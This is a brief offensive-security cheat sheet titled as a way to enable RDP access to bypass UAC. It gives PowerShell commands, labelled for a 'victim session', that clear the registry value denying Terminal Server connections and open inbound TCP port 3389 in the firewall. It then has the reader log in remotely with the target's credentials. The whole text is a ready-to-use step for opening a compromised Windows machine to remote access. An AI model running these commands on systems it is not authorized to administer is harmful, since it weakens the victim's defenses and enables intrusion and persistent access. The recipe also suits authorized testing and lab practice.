# Enable RDP Access to bypass UAC

## Commands:

### Victim session

#### 1) Disable connection denial

    Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name "fDenyTSConnections" -Value 0

#### 2) Enable Remote Desktop Connection

    New-NetFirewallRule -DisplayName "Remote Desktop" -Direction Inbound -Action Allow -Protocol TCP -LocalPort 3389

### Then connect via RDP using any RDP client like remmina or xfreerdp to target using their credentials
